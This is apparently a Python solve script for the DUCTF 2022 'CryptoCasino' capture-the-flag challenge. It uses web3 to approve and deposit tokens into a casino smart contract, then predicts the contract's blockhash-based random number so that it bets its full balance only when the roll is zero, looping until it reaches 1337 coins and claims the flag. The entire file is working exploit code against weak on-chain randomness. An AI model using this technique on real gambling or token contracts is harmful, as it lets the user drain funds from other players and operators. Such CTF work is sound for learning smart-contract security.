from web3 import Web3
import json
from CryptoCasino.Util import init_challenge, get_flag
from web3.middleware import geth_poa_middleware

ENDPOINT_URL = "https://blockchain-cryptocasino-02b957b4cf1d1810-eth.2022.ductf.dev/"
DETAILS_URL = "https://blockchain-cryptocasino-02b957b4cf1d1810.2022.ductf.dev/challenge"
SOLVE_URL = "https://blockchain-cryptocasino-02b957b4cf1d1810.2022.ductf.dev/challenge/solve"
CHAIN_ID = 31337

NEEDED_AMOUNT = 1337

w3 = Web3(Web3.HTTPProvider(ENDPOINT_URL))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

player_addr, player_key, ducoin_contract_addr, casino_contract_addr = init_challenge(DETAILS_URL)

COIN_CONTRACT_PATH = "DUCoin.sol"
CASINO_CONTRACT_PATH = "Casino.sol"

ducoin_abi = json.load(open('./DUCoin.json'))
casino_abi = json.load(open('./Casino.json'))

casino_contract = w3.eth.contract(address=casino_contract_addr, abi=casino_abi)

ducoin_contract = w3.eth.contract(address=ducoin_contract_addr, abi=ducoin_abi)


def call_contract_method(method_with_args):
    nonce = w3.eth.get_transaction_count(player_addr)
    tx = method_with_args.buildTransaction({
        'chainId': 31337,
        'nonce': nonce,
        'from': player_addr,
        'gasPrice': w3.eth.gas_price
    })
    gas = w3.eth.estimate_gas(tx)
    tx['gas'] = gas
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=player_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt


def get_casino_balance():
    return casino_contract.functions.balances(player_addr).call()


def get_ducoin_balance():
    return ducoin_contract.functions.balanceOf(player_addr).call()


def log_casino_balance():
    print(f"Casino balance: {get_casino_balance()}")


def log_ducoin_balance():
    print(f"DuCoin balance: {get_ducoin_balance()}")


def log_balances():
    log_ducoin_balance()
    log_casino_balance()


def get_trial_coins():
    get_trial_coins_call = casino_contract.functions.getTrialCoins()
    call_contract_method(get_trial_coins_call)


def deposit_coins(amount):
    deposit_function = casino_contract.functions.deposit(amount)
    call_contract_method(deposit_function)


def withdraw_coins(amount):
    withdraw_function = casino_contract.functions.withdraw(amount)
    call_contract_method(withdraw_function)


def approve(amount):
    approve_function = ducoin_contract.functions.approve(casino_contract_addr, amount)
    call_contract_method(approve_function)


def play_round(bet):
    play_function = casino_contract.functions.play(bet)
    call_contract_method(play_function)


def init_exploit():
    approve(2000)
    get_trial_coins()
    deposit_coins(7)
    log_balances()


def exploit():
    rounds = 0
    while get_casino_balance() < NEEDED_AMOUNT:
        print(f"Round {rounds}")
        if should_bet():
            print("Random is 0")
            play_round(get_casino_balance())
            log_casino_balance()
        else:
            print("waiting for next round")
            play_round(0)
        withdraw_coins(0)
        rounds += 1

    print("Solved")
    withdraw_coins(NEEDED_AMOUNT)
    get_flag(SOLVE_URL)


def should_bet():
    ab = int.from_bytes(w3.eth.getBlock('latest').hash, "big")
    a = ab & 0xffffffff
    b = (ab >> 32) & 0xffffffff
    return a % 6 == 0 and b % 6 == 0


# def randomNumber():
#    ab = uint256(blockhash(block.number - 1));
#    uint256 a = ab & 0xffffffff;
#    uint256 b = (ab >> 32) & 0xffffffff;
#    uint256 x = uint256(blockhash(block.number));
#    return uint8((a * x + b) % 6);


def main():
    init_exploit()
    exploit()
    log_balances()


if __name__ == "__main__":
    main()
